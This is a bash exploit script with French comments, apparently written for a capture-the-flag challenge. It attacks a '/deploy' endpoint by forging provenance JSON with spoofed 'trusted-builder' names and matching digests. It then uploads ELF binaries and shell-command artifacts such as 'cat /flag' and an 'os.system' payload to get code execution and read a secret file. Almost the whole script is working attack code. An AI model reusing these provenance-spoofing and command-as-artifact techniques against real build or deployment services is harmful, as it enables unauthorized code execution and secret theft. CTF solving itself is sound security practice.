#!/bin/bash
# Usage: bash buildfarm_all.sh [URL]
# Place hello et flagrd (les ELF reçus) dans le meme dossier. Gere les noms "hello (1)" etc.
B=${1:-https://43ogqi66u63yzgpx.t.ctf.tg}
BUILDER="trusted-builder"
jqbody(){ python3 -c "import json,sys;print(json.dumps({'artifact':sys.argv[1],'provenance':{'builder':sys.argv[2],'digest':sys.argv[3]}}))" "$1" "$2" "$3"; }
post(){ curl -sk -X POST "$B/deploy" -H 'Content-Type: application/json' -d "$1"; }
sha(){ printf '%s' "$1" | sha256sum | cut -d' ' -f1; }
find_elf(){ ls -1 "$1" "$1 "*'(1)'* 2>/dev/null | head -1; for f in "$1"*; do [ -f "$f" ] && file "$f" 2>/dev/null | grep -q ELF && { echo "$f"; return; }; done; }

echo "################ 1) GATE BUILDER ################"
for b in trusted trusted-builder TRUSTED-BUILDER "x trusted-builder" buildfarm "buildfarm-artswap" "" github-actions slsa-github-generator "https://github.com/trusted/builder"; do
  D=$(sha 'QUJD'); printf '%-35s -> ' "$b"; post "$(jqbody 'QUJD' "$b" "$D")"; echo
done

echo; echo "################ 2) REPONSE COMPLETE + HEADERS ################"
D=$(sha 'QUJD')
curl -vsk -X POST "$B/deploy" -H 'Content-Type: application/json' -d "$(jqbody 'QUJD' "$BUILDER" "$D")" 2>&1 | grep -E '^< |deploy|NCTF|flag' | head -30

echo; echo "################ 3) EXEC TEST (ELF marqueur) ################"
H=$(find_elf hello)
if [ -n "$H" ]; then echo "[elf: $H]"; A=$(base64 -w0 "$H"); D=$(sha "$A"); post "$(jqbody "$A" "$BUILDER" "$D")"; echo
else echo "hello introuvable dans le dossier"; fi

echo; echo "################ 4) EXEC TEST (ELF sonde /flag) ################"
P=$(find_elf flagrd)
if [ -n "$P" ]; then echo "[elf: $P]"; A=$(base64 -w0 "$P"); D=$(sha "$A"); post "$(jqbody "$A" "$BUILDER" "$D")"; echo
else echo "flagrd introuvable"; fi

echo; echo "################ 5) ARTEFACTS = COMMANDES ################"
for ART in 'cat /flag' 'sh -c "cat /flag"' '#!/bin/sh
cat /flag' 'import os;os.system("cat /flag")'; do
  D=$(sha "$ART"); printf '%-30s -> ' "$(echo "$ART"|head -1)"; post "$(jqbody "$ART" "$BUILDER" "$D")"; echo
done

echo; echo "################ 6) GET /deploy et racine ################"
curl -sk "$B/deploy"; echo; curl -sk "$B/"; echo
